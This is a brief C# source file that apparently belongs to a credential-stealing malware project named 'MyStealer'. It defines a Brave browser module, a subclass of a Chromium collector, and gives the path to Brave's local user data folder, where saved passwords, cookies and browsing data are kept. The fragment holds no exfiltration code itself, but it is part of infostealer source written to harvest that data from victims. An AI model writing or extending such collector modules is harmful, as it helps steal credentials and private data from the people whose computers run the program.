using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Brave : Chromium
    {
        public override string ModuleName => "Brave";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data");
    }
}
